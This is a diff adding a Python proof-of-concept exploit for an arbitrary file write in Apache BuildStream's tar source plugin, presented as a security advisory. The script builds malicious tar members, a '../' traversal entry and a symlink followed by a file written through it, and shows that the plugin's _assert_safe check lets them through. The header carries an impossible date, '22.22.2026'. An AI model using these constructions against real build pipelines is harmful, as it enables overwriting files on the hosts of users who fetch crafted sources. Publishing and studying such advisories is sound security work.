@@ -1,0 +1,101 @@
+#!/usr/bin/env python
+#
+#
+# Apache BuildStream 2.8.0 (symlink) Arbitrary File Write
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://buildstream.apache.org
+# Affected version: <=2.8.0
+#
+# Summary: BuildStream is a powerful software integration tool
+# that allows developers to automate the integration of software
+# components including operating systems, and to streamline the
+# software development and production process.
+#
+# Desc: Apache BuildStream's tar source plugin extracts archives
+# without safely resolving symbolic links (link following). A
+# malicious source tarball can include a symlink entry that points
+# outside the staging directory and then a file entry that writes
+# through it, so a crafted upstream source can create or overwrite
+# files on the host with the privileges of the user running BuildStream,
+# as part of source fetching. On Python < 3.12 the plugin relied
+# on an incomplete internal check (_assert_safe, which skipped
+# symlink members and used a buggy basename/prefix comparison) as
+# the only guard. The fix replaces that check with a custom extraction
+# filter built on the Python tarfile data and tar filters, applied
+# on all Python versions (using a local copy of tarfile.py on Python
+# < 3.12).
+#
+# Tested on: Linux, Python 3.10
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+# Macedonian Information Security Research & Development Laboratory
+# Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6005
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6005
+#
+#
+# 22.22.2026
+#
+
+import io######
+import os######
+import sys#####
+import tarfile#
+import tempfile
+
+class Kukla:
+    def __str__(self): return "tar-source"
+
+def _assert_safe(self, member, target_dir):
+    final_path = os.path.abspath(os.path.join(target_dir, member.path))
+    if not final_path.startswith(target_dir):
+        raise Exception("attempts to extract outside staging area: {} -> {}".format(member.path, final_path))
+    if member.islnk():
+        linked_path = os.path.abspath(os.path.join(target_dir, member.linkname))
+        if not linked_path.startswith(target_dir):
+            raise Exception("hardlink outside staging area")
+
+base = tempfile.mkdtemp(prefix="bst_poc_")
+staging = os.path.join(base, "staging")
+os.makedirs(staging)
+sibling_secret = os.path.join(base, "staging_evil")
+os.makedirs(sibling_secret)
+print("target_dir (staging):", staging)
+print("sibling out-of-bounds:", sibling_secret)
+print("py<3.12 (no builtin filter path):", sys.version_info < (3, 12))
+print()
+
+ti = tarfile.TarInfo(name="../staging_evil/pwned")
+data = b"OWNED-VIA-PREFIX-BUG"
+ti.size = len(data)
+passed = True
+try:
+    _assert_safe(Kukla(), ti, staging)
+except Exception as e:
+    passed = False
+    print("(A) _assert_safe REJECTED:", e)
+if passed:
+    final = os.path.abspath(os.path.join(staging, ti.path))
+    print(f"(A) _assert_safe ALLOWED  member '../staging_evil/pwned'  -> {final}")
+    print(f"    escapes staging? {not final.startswith(staging + os.sep)}  (writes into sibling dir)")
+
+print()
+sym = tarfile.TarInfo(name="evil")
+sym.type = tarfile.SYMTYPE
+sym.linkname = os.path.abspath(os.path.join(base, "OUTSIDE"))
+f = tarfile.TarInfo(name="evil/pwned")
+f.size = 5
+for m in (sym, f):
+    try:
+        _assert_safe(Kukla(), m, staging)
+        kind = "symlink->" + (m.linkname if m.issym() else "")
+        print(f"(B) _assert_safe ALLOWED  {m.name!r} ({'symlink' if m.issym() else 'file'}{' -> '+m.linkname if m.issym() else ''})")
+    except Exception as e:
+        print(f"(B) _assert_safe REJECTED {m.name!r}: {e}")
+print("    => on POSIX, extractall writes 'evil/pwned' THROUGH the symlink to",
+      os.path.abspath(os.path.join(base, "OUTSIDE", "pwned")))
